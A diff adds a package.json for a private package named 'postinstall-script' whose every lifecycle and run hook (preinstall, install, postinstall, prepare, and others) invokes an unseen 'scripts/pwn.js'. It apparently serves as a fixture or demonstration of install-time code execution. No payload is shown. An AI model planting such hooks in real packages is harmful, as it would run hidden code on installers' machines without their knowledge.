@@ -1,0 +1,17 @@
+{
+  "name": "postinstall-script",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "node scripts/pwn.js preinstall",
+    "install": "node scripts/pwn.js install",
+    "postinstall": "node scripts/pwn.js postinstall",
+    "prepare": "node scripts/pwn.js prepare",
+    "prepack": "node scripts/pwn.js prepack",
+    "build": "node scripts/pwn.js build",
+    "start": "node scripts/pwn.js start"
+  },
+  "dependencies": {
+    "express": "4.21.2"
+  }
+}
